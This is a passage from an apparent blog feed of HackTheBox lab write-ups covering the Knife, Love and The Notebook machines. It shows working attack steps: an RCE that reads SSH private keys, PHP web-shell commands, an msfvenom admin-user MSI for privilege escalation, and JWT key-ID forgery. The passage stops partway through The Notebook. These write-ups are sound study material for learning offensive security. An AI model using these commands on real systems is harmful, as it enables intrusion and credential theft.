on it show that the PHP version used is 8.1.0-dev.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ nikto -h http://10.129.151.250/&lt;/span&gt;
&lt;span class="code-line"&gt;- Nikto v2.1.6&lt;/span&gt;
&lt;span class="code-line"&gt;---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;+ Target IP:          10.129.151.250&lt;/span&gt;
&lt;span class="code-line"&gt;+ Target Hostname:    10.129.151.250&lt;/span&gt;
&lt;span class="code-line"&gt;+ Target Port:        80&lt;/span&gt;
&lt;span class="code-line"&gt;+ Start Time:         2021-05-25 12:15:53 (GMT-4)&lt;/span&gt;
&lt;span class="code-line"&gt;---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;+ Server: Apache/2.4.41 (Ubuntu)&lt;/span&gt;
&lt;span class="code-line"&gt;+ Retrieved x-powered-by header: PHP/8.1.0-dev&lt;/span&gt;
&lt;span class="code-line"&gt;+ The anti-clickjacking X-Frame-Options header is not present.&lt;/span&gt;
&lt;span class="code-line"&gt;+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/span&gt;
&lt;span class="code-line"&gt;+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type&lt;/span&gt;
&lt;span class="code-line"&gt;+ No CGI Directories found (use &amp;#39;-C all&amp;#39; to force check all possible dirs)&lt;/span&gt;
&lt;span class="code-line"&gt;+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This specific 8.1.0-dev PHP version is vulnerable to a &lt;a href="https://packetstormsecurity.com/files/162749/php_8.1.0-dev.py.txt"&gt;backdoor RCE&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Using the exploit script we can directly execute command on the system. A few
enumeration show that we are running command as &lt;code&gt;james&lt;/code&gt; and we can grab his SSH
private key.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;└─$ python3 rce.py -u http://10.129.151.250/ -c 'cat  /home/james/.ssh/id_rsa' &amp;gt; id_rsa&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;A quick edit allows us remove the "result" from the python script then we use
&lt;code&gt;chmod 600&lt;/code&gt; to fix the SSH key right and avoid the permission warning. Then we
add the key to the &lt;code&gt;authorized_keys&lt;/code&gt; file still using the PHP backdoor.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;└─$ python3 rce.py -u http://10.129.151.250/ -c 'cat  /home/james/.ssh/id_rsa.pub &amp;gt; /home/james/.ssh/authorized_keys'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can then connect as &lt;code&gt;james&lt;/code&gt; on the box and grab the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ssh james@10.129.151.250 -i id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;james@knife:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;39169b04d1705adad09a0ba6aafe5363&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We look at our permission on the box and found that we can run &lt;code&gt;/usr/bin/knife&lt;/code&gt;
on the box. This is a symlink to a ruby script used by
&lt;a href="https://docs.chef.io/"&gt;chef&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;james@knife:~$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for james on knife:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User james may run the following commands on knife:&lt;/span&gt;
&lt;span class="code-line"&gt;    (root) NOPASSWD: /usr/bin/knife&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Look at the &lt;a href="https://docs.chef.io/workstation/knife_exec/"&gt;Knife documentation&lt;/a&gt;
we found that &lt;code&gt;knife exec&lt;/code&gt; can execute ruby scripts. We execute the &lt;code&gt;id&lt;/code&gt; command
to validate that we are running as root and then create the &lt;code&gt;.ssh&lt;/code&gt; folder and
add james' SSH key to the &lt;code&gt;authorized_keys&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;james@knife:~$ cat h.rb&lt;/span&gt;
&lt;span class="code-line"&gt;puts &amp;quot;Hello World&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;system &amp;quot;id&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;system &amp;quot;mkdir -p /root/.ssh/&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;system &amp;quot;cp /home/james/.ssh/authorized_keys /root/.ssh/&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;james@knife:~$ sudo /usr/bin/knife exec h.rb -VVV&lt;/span&gt;
&lt;span class="code-line"&gt;Hello World&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then connect as root on the box (either from our kali or directly from the box)
and grab the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ssh root@10.129.151.250 -i id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;root@knife:~# cat root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;9c158f53231321d8fdf47e3f431b0a77&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;A really easy box perfect for new comers.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="php"></category><category term="chef"></category></entry><entry><title>HTB: Love</title><link href="https://maggick.fr/2021/08/htb-love.html" rel="alternate"></link><published>2021-08-09T17:55:00+02:00</published><updated>2021-08-09T17:55:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-08-09:/2021/08/htb-love.html</id><summary type="html">&lt;p&gt;&lt;img alt="Love card" class="align-left" src="/media/2021.08/love_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/344"&gt;Love&lt;/a&gt; published on
May 1 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/157669"&gt;pwnmeow&lt;/a&gt;
This box is classified as an easy machine. This box implies a SSRF, some php
file and an AlwaysInstallElevated privilege on a Windows box.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.08/love_card.png" alt="Love card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/344"&gt;Love&lt;/a&gt; published on
May 1 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/157669"&gt;pwnmeow&lt;/a&gt;
This box is classified as an easy machine. This box implies a SSRF, some php
file and an AlwaysInstallElevated privilege on a Windows box.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. As always with Windows box a lot of ports are open.
We note the few HTTP services (80, 443, 5000).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Thu May 20 09:46:35 2021 as: nmap -sSV -p- -A -oN notes.md 10.129.143.132&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.143.132&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.012s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65517 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE      VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)&lt;/span&gt;
&lt;span class="code-line"&gt;| http-cookie-flags:&lt;/span&gt;
&lt;span class="code-line"&gt;|   /:&lt;/span&gt;
&lt;span class="code-line"&gt;|     PHPSESSID:&lt;/span&gt;
&lt;span class="code-line"&gt;|_      httponly flag not set&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: Voting System using PHP&lt;/span&gt;
&lt;span class="code-line"&gt;135/tcp   open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn&lt;/span&gt;
&lt;span class="code-line"&gt;443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: 403 Forbidden&lt;/span&gt;
&lt;span class="code-line"&gt;| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in&lt;/span&gt;
&lt;span class="code-line"&gt;| Not valid before: 2021-01-18T14:00:16&lt;/span&gt;
&lt;span class="code-line"&gt;|_Not valid after:  2022-01-18T14:00:16&lt;/span&gt;
&lt;span class="code-line"&gt;|_ssl-date: TLS randomness does not represent time&lt;/span&gt;
&lt;span class="code-line"&gt;| tls-alpn:&lt;/span&gt;
&lt;span class="code-line"&gt;|_  http/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)&lt;/span&gt;
&lt;span class="code-line"&gt;3306/tcp  open  mysql?&lt;/span&gt;
&lt;span class="code-line"&gt;| fingerprint-strings:&lt;/span&gt;
&lt;span class="code-line"&gt;|   DNSStatusRequestTCP, SIPOptions:&lt;/span&gt;
&lt;span class="code-line"&gt;|_    Host &amp;#39;10.10.14.70&amp;#39; is not allowed to connect to this MariaDB server&lt;/span&gt;
&lt;span class="code-line"&gt;5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: 403 Forbidden&lt;/span&gt;
&lt;span class="code-line"&gt;5040/tcp  open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-server-header: Microsoft-HTTPAPI/2.0&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: Not Found&lt;/span&gt;
&lt;span class="code-line"&gt;5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-server-header: Microsoft-HTTPAPI/2.0&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: Not Found&lt;/span&gt;
&lt;span class="code-line"&gt;| ssl-cert: Subject: commonName=LOVE&lt;/span&gt;
&lt;span class="code-line"&gt;| Subject Alternative Name: DNS:LOVE, DNS:Love&lt;/span&gt;
&lt;span class="code-line"&gt;| Not valid before: 2021-04-11T14:39:19&lt;/span&gt;
&lt;span class="code-line"&gt;|_Not valid after:  2024-04-10T14:39:19&lt;/span&gt;
&lt;span class="code-line"&gt;|_ssl-date: 2021-05-20T14:11:47+00:00; +21m33s from scanner time.&lt;/span&gt;
&lt;span class="code-line"&gt;| tls-alpn:&lt;/span&gt;
&lt;span class="code-line"&gt;|_  http/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-server-header: Microsoft-HTTPAPI/2.0&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: Not Found&lt;/span&gt;
&lt;span class="code-line"&gt;49664/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49665/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49666/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49667/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49668/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49669/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49670/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;On the port 80 we have a login form for a PHP voting system.&lt;/p&gt;
&lt;p&gt;On the port 443 we have a FileScanner with a demo. As pointed out by the &lt;code&gt;nmap&lt;/code&gt; scan and the SSL
certificate we need to use another domain &lt;code&gt;staging.love.htb&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="love ssl certificate" src="/media/2021.08/love_01.png"&gt;&lt;/p&gt;
&lt;p&gt;Here we can input an URL to get it "scanned". After a few trial with our files (and a simple python server)
scanned means echoed.&lt;/p&gt;
&lt;p&gt;Looking back at our &lt;code&gt;nmap&lt;/code&gt; scan we can see that we are forbidden to access the webpage on port 5000.
We use the scanner to display it. It contains the password for the voting system &lt;code&gt;@LoveIsInTheAir!!!!&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="admin password for the voting system" src="/media/2021.08/love_02.png"&gt;&lt;/p&gt;
&lt;p&gt;We connect to the voting system. There is a few vulnerabilities (one of them even unauthenticated Oo)
Using the &lt;a href="https://www.exploit-db.com/exploits/49445"&gt;(unauthenticated) RCE exploit&lt;/a&gt; we can get a
webshell by uploading &lt;code&gt;/usr/share/webshells/php/simple-backdoor.php&lt;/code&gt; as an image for a candidate (after
adding a position). We can then execute Windows command on the OS.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ curl &amp;#39;http://love.htb/images/simple-backdoor.php?cmd=whoami%20/all&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;USER INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User Name   SID&lt;/span&gt;
&lt;span class="code-line"&gt;=========== =============================================&lt;/span&gt;
&lt;span class="code-line"&gt;love\phoebe S-1-5-21-2955427858-187959437-2037071653-1002&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GROUP INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Group Name                             Type             SID          Attributes&lt;/span&gt;
&lt;span class="code-line"&gt;====================================== ================ ============ ==================================================&lt;/span&gt;
&lt;span class="code-line"&gt;Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;Mandatory Label\Medium Mandatory Level Label            S-1-16-8192&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PRIVILEGES INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Privilege Name                Description                          State&lt;/span&gt;
&lt;span class="code-line"&gt;============================= ==================================== ========&lt;/span&gt;
&lt;span class="code-line"&gt;SeShutdownPrivilege           Shut down the system                 Disabled&lt;/span&gt;
&lt;span class="code-line"&gt;SeChangeNotifyPrivilege       Bypass traverse checking             Enabled&lt;/span&gt;
&lt;span class="code-line"&gt;SeUndockPrivilege             Remove computer from docking station Disabled&lt;/span&gt;
&lt;span class="code-line"&gt;SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled&lt;/span&gt;
&lt;span class="code-line"&gt;SeTimeZonePrivilege           Change the time zone                 Disabled&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can grab the user flag on the way:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ curl &amp;#39;http://love.htb/images/simple-backdoor.php?cmd=type%20..\..\..\..\Users\Phoebe\Desktop\user.txt&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;pre&amp;gt;eb7553538ae21eec5e4d1d444beaf541&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We use the image upload function to put &lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"&gt;WinPeas&lt;/a&gt; on the box
and we run it using our webshell. The output is quit huge (2344 lines).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ curl &amp;#39;http://love.htb/images/simple-backdoor.php?cmd=winPEASx64.exe&amp;#39; &amp;gt;&amp;gt; winpeas_res&lt;/span&gt;
&lt;span class="code-line"&gt;└─$ wc -l winpeas_res&lt;/span&gt;
&lt;span class="code-line"&gt;2344 winpeas_res&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We see that the AlwaysInstallElevated registry keys are set to one both in HKLM
and HKCU.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[+] Checking AlwaysInstallElevated&lt;/span&gt;
&lt;span class="code-line"&gt;[?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated&lt;/span&gt;
&lt;span class="code-line"&gt;  AlwaysInstallElevated set to 1 in HKLM!&lt;/span&gt;
&lt;span class="code-line"&gt;  AlwaysInstallElevated set to 1 in HKCU!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use &lt;code&gt;msfvenom&lt;/code&gt; to generate an msi file that will "install" a new admin user
with a know password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ #msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then connect to the box using
&lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt; and grab the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ evil-winrm -i love.htb -u rottenadmin -p &amp;#39;P@ssword123!&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Evil-WinRM shell v2.4&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\rottenadmin\Documents&amp;gt; type ..\..\Administrator\Desktop\root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;af2d13b1f523eed72cddf44b166c4601&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;Overall a nice box with a few rabbit hole (very OSCP like). I banged my head a
few time as I did not notice the port 5000 403. Also the CVE used to get the RCE
is completely unauthenticated so a simple Google search "php voting system
exploit" would have return the same exploit. Also the exploit date (May 7) seems to be
posterior to the box publication (May 1) which is odd and maybe not the intended
RCE way.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="windows"></category><category term="php"></category><category term="AlwaysInstallElevated"></category></entry><entry><title>HTB: The Notebook</title><link href="https://maggick.fr/2021/08/htb-the-notebook.html" rel="alternate"></link><published>2021-08-01T10:45:00+02:00</published><updated>2021-08-01T10:45:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-08-01:/2021/08/htb-the-notebook.html</id><summary type="html">&lt;p&gt;&lt;img alt="The Notebook Card" class="align-left" src="/media/2021.08/thenotebook_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/320"&gt;TheNotebook&lt;/a&gt; publish on
Mars 6, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/120514"&gt;mostwanted002&lt;/a&gt;.
This box is rated as a medium machine. It implies a JWT token, some PHP files
and a docker exploit.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.08/thenotebook_card.png" alt="The Notebook Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/320"&gt;TheNotebook&lt;/a&gt; publish on
Mars 6, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/120514"&gt;mostwanted002&lt;/a&gt;.
This box is rated as a medium machine. It implies a JWT token, some PHP files
and a docker exploit.&lt;/p&gt;


&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 (HTTP) and 22 (SSH) are
open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Nmap scan report for 10.129.82.59&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.013s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65532 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE    SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open     http    nginx 1.14.0 (Ubuntu)&lt;/span&gt;
&lt;span class="code-line"&gt;10010/tcp filtered rxapi&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="web"&gt;Web&lt;/h1&gt;
&lt;p&gt;The website is an application to take notes. We can self register a user. We notice that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;There is authorization control to access the notes but we need to know the UUID to access them.&lt;/li&gt;
&lt;li&gt;The first note we upload start with the number 5. Being on a VIP box means that there is already existing notes.&lt;/li&gt;
&lt;li&gt;The authentication is using a &lt;a href="https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a"&gt;JWT token&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Our &lt;a href="https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a"&gt;JWT token&lt;/a&gt; has the following values:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9&lt;/span&gt;
&lt;span class="code-line"&gt;{&amp;quot;typ&amp;quot;:&amp;quot;JWT&amp;quot;,&amp;quot;alg&amp;quot;:&amp;quot;RS256&amp;quot;,&amp;quot;kid&amp;quot;:&amp;quot;http://localhost:7070/privKey.key&amp;quot;}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;eyJ1c2VybmFtZSI6InJyIiwiZW1haWwiOiJyQHIuY29tIiwiYWRtaW5fY2FwIjowfQ&lt;/span&gt;
&lt;span class="code-line"&gt;{&amp;quot;username&amp;quot;:&amp;quot;rr&amp;quot;,&amp;quot;email&amp;quot;:&amp;quot;r@r.com&amp;quot;,&amp;quot;admin_cap&amp;quot;:0}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A few interesting point about this JWT token:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;the kid (Key ID) in the header is an URL&lt;/li&gt;
&lt;li&gt;there is a &lt;code&gt;admin_cap&lt;/code&gt; parameter in the JWT payload.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We host a simple HTTP server using python3 and change the KID value by our IP
address and port and got a ping on it (with a 404).&lt;/p&gt;
&lt;p&gt;We use &lt;a href="https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9"&gt;ssh-keygen to generate a RS256 private key&lt;/a&gt;
and we make it available using the python server.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use &lt;a href="https://jwt.io/"&gt;https://jwt.io/&lt;/a&gt; to generate a new token with the
